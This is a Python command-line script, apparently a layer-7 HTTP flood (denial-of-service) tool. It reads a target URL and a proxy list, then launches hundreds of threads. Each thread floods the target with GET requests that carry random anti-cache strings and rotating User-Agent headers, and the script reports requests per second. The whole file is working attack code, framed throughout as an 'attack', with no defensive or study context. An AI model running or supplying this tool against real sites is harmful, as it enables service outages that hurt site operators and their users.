from random_user_agent.user_agent import UserAgent
import threading
import argparse
import logging
import random
import socket
import socks
import time
import ssl
import sys

parser = argparse.ArgumentParser()
parser.add_argument("url", nargs="?", type=str, help="Target URL. Format: \"http(s)://example.com/path/index.php?param1=param1_value&param2=param2_value\"")
parser.add_argument("proxy_list", nargs="?", type=str, help="Proxy list file. Closes when file is invalid")
parser.add_argument("proxy_type", nargs="?", type=str, help="Proxy list type. Proxy Types: SOCKS5, SOCKS4, HTTP")
parser.add_argument("-p", "--port", type=int, default=80, help="URL host's port. Sets to 443 when using HTTPS protocol")
parser.add_argument("-m", "--method", type=str, default="GET", help="HTTP request method. Default: GET")
parser.add_argument("-t", "--threads", type=int, default=777, help="Max threads. Default: 777")
parser.add_argument("-d", "--debug", action="store_true", help="Enables debug mode")
parser.add_argument("--timeout", type=int, default=None, help="Set default socket connection timeout")
parser.add_argument("--rpp", type=int, default=777, help="Set requests per proxy. Default: 777")

parser.set_defaults(debug=False)

args = parser.parse_args()

if not args.url:
    parser.print_help()
    print("URL is required. Example: https://example.com/path/")
    sys.exit()
elif not args.proxy_list:
    parser.print_help()
    print("Proxy list file is required. Example: ./socks5_list.txt")
    sys.exit()
elif not args.proxy_type:
    parser.print_help()
    print("Proxy type is required. Example: SOCKS5, SOCKS4, HTTP")
    sys.exit()

if args.port < 1 or args.port > 65535:
    print("Port number must be 1-65535")
    sys.exit()

if args.threads < 1:
    print("Invalid thread value. Minimum is 1")
    sys.exit()

if args.debug:
    debug = True

url = args.url
proxy_list = args.proxy_list
proxy_type = args.proxy_type
port = args.port
method = args.method
max_threads = args.threads
debug = args.debug
timeout = args.timeout
rpp = args.rpp

if debug:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%H:%m:%S",
        level=logging.DEBUG
    )
else:
    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%H:%m:%S",
        level=logging.INFO
    )

logger = logging.getLogger(__file__)
url = url.strip()

try:
    protocol, url = url.split("://")
except ValueError:
    print("Invalid URL format! Format: https://example.com/path/")
    sys.exit()
except Exception as e:
    print(f"Protocol/URL Split Error: {e}")
    sys.exit()

try:
    url, path = url.split("/", 1)
except ValueError:
    path = ""
    pass
except Exception as e:
    print(f"URL/Path Split Error: {e}")
    sys.exit()

try:
    path, parameters = path.split("?")
except ValueError:
    parameters = ""
    pass
except Exception as e:
    print(f"Path/Parameters Split Error: {e}")
    sys.exit()

protocol_list = ["HTTP", "HTTPS"]

protocol = protocol.upper()
if not protocol in protocol_list:
    print(f"Invalid protocol: {protocol}")
    sys.exit()
if protocol == "HTTPS":
    port = 443
path = f"/{path}"
proxy_type = proxy_type.upper()
parameters_str = parameters
if parameters != "":
    parameters = f"&{parameters}"

try:
    proxy_file = open(proxy_list, "r")
    proxies = proxy_file.readlines()
    proxy_file.close()
except FileNotFoundError:
    print(f"Proxy list file not found!")
    sys.exit()
except Exception as e:
    print(f"Cannot open proxy list file: {e}")
    sys.exit()

try:
    proxy_type_str = proxy_type
    proxy_type = getattr(socks, proxy_type)
except AttributeError:
    print(f"{proxy_type} is not a valid proxy type! Proxy Types: SOCKS5, SOCKS4, HTTP")
    sys.exit()
except Exception as e:
    print(f"Proxy Type Error: {e}")
    sys.exit()

if timeout != None:
    try:
        timeout = int(timeout)
    except Exception as e:
        print(f"Set Default Timeout Error: {e}")
        sys.exit()

try:
    url_ip = socket.gethostbyname(url)
except Exception as e:
    print(f"Unable to resolve domain's IP")
    url_ip = "Unable to resolve"

if url == url_ip:
    url_ip = ""
else:
    url_ip = f"Domain IP: {url_ip}\r\n"

proxies_length = len(proxies)

print(f"[---] Attack Information [---]\r\nProtocol: {protocol}\r\nURL: {url}\r\n{url_ip}Port: {port}\r\nPath: {path}\r\nParameters: {parameters_str}\r\nMethod: {method}\r\nProxy List: {proxy_list}\r\nProxy Type: {proxy_type_str}\r\nProxies: {proxies_length}\r\nTimeout: {timeout}\r\nMax Thread: {max_threads}\r\nDebug: {debug}\r\n")

try:
    input("Press enter to initialize the attack.")
except KeyboardInterrupt:
    sys.exit()

active_threads = 0
usera = UserAgent()
chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
chars_list = list(chars)
hrs = 0
Bps = 0

def HTTPS(host, port, proxy_host, proxy_port):
    try:
        global active_threads
        global hrs
        global Bps
        active_threads += 1
        port = int(port)
        proxy_port = int(port)
        rp = int(rpp)
        sock = socks.socksocket()
        sock.settimeout(timeout)
        sock.connect((host, port))
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
        for _ in range(rp):
            anti_cache_list = random.choices(chars_list, k=77)
            anti_cache = "".join(anti_cache_list)
            user_agent = usera.get_random_user_agent()
            http = f"{method} {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n"
            sent_bytes = sock.send(http.encode())
            Bps += sent_bytes
            hrs += 1
    except Exception as e:
        logger.debug(f"HTTPS Error: {e}")
        pass
    finally:
        active_threads -= 1

def HTTP(host, port, proxy_host, proxy_port):
    try:
        global active_threads
        global hrs
        global Bps
        active_threads += 1
        port = int(port)
        proxy_port = int(proxy_port)
        rp = int(rpp)
        sock = socks.socksocket()
        sock.connect((host, port))
        while True:
            anti_cache_list = random.choices(chars_list, k=77)
            anti_cache = "".join(anti_cache_list)
            user_agent = usera.get_random_user_agent()
            http = f"{method} {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n"
            sent_bytes = sock.send(http.encode())
            Bps += sent_bytes
            hrs += 1
    except Exception as e:
        logger.debug(f"HTTP Error: {e}")
        pass
    finally:
        active_threads -= 1

def verbose_status():
    try:
        global hrs
        global Bps
        separator = " " * 6
        while True:
            time.sleep(1)
            print(f"Threads: {active_threads} {separator[len(str(active_threads)):]} HR/s: {hrs} {separator[len(str(hrs)):]} kB/s: {Bps / 1000:.2f}")
            hrs = 0
            Bps = 0
    except Exception as e:
        print(f"Error initializing verbose status: {e}")
        sys.exit()

def main():
    try:
        logger.info("Initializing attack...")        
        threading.Thread(target=verbose_status, daemon=True).start()
        while True:
            for proxy in proxies:
                proxy = proxy.strip()
                proxy_host, proxy_port = proxy.split(":")
                while True:
                    if active_threads >= max_threads:
                        continue
                    threading.Thread(target=eval(protocol), args=[url, port, proxy_host, proxy_port], daemon=True).start()
                    break
    except Exception as e:
        print(f"Main Error: {e}")
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    main()
